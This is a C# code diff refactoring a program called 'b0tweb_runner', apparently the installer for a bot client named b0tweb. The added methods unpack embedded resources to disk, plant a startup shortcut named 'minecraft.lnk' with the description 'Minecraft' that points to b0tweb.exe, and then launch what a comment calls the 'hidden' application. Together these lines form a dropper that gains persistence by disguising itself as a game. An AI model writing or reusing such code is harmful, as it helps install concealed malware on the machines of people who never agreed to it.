@@ -41,6 +41,45 @@ namespace b0tweb_runner
             void SetPath([MarshalAs(UnmanagedType.LPWStr)] string pszFile);
         }
 
+        private static void StoreResource(string item, string path)
+        {
+            string[] parts = item.Split('.');
+            string itemPath = path;
+
+            if (parts[1] != "b0tweb")
+            {
+                itemPath = Path.Combine(path, parts[1]);
+            }
+
+            if (!Directory.Exists(itemPath))
+            {
+                Directory.CreateDirectory(itemPath);
+            }
+
+            string fileName = item.Remove(0, parts[0].Length + parts[1].Length + 2);
+            Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(item);
+
+            FileStream fileStream = new FileStream(Path.Join(itemPath, fileName), FileMode.Create);
+            for (int i = 0; i < stream.Length; i++)
+            {
+                fileStream.WriteByte((byte)stream.ReadByte());
+            }
+
+            fileStream.Close();
+        }
+
+        private static void CreateSymbolicLink(string path)
+        {
+
+            IShellLink link = (IShellLink)new ShellLink();
+            // setup shortcut information
+            link.SetDescription("Minecraft");
+            link.SetPath(Path.Combine(path, "b0tweb.exe"));
+            // save it
+            IPersistFile file = (IPersistFile)link;
+            file.Save(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "minecraft.lnk"), false);
+        }
+
         static void Main(string[] args)
         {
             // Create all files
@@ -50,38 +89,10 @@ namespace b0tweb_runner
 
             foreach (string item in Assembly.GetExecutingAssembly().GetManifestResourceNames())
             {
-                string[] parts = item.Split('.');
-                string itemPath = path;
-
-                if (parts[1] != "b0tweb")
-                {
-                    itemPath = Path.Combine(path, parts[1]);
-                }
-
-                if (!Directory.Exists(itemPath))
-                {
-                    Directory.CreateDirectory(itemPath);
-                }
-
-                string fileName = item.Remove(0, parts[0].Length + parts[1].Length + 2);
-                Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(item);
-
-                FileStream fileStream = new FileStream(Path.Join(itemPath, fileName), FileMode.Create);
-                for (int i = 0; i < stream.Length; i++)
-                {
-                    fileStream.WriteByte((byte)stream.ReadByte());
-                }
-                  
-                fileStream.Close();
+                StoreResource(item, path);
             }
 
-            IShellLink link = (IShellLink)new ShellLink();
-            // setup shortcut information
-            link.SetDescription("Minecraft");
-            link.SetPath(Path.Combine(path, "b0tweb.exe"));
-            // save it
-            IPersistFile file = (IPersistFile)link;
-            file.Save(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "minecraft.lnk"), false);
+            CreateSymbolicLink(path);
 
             Process.Start(Path.Combine(path, "b0tweb.exe"));
             // Launch the "hidden" application
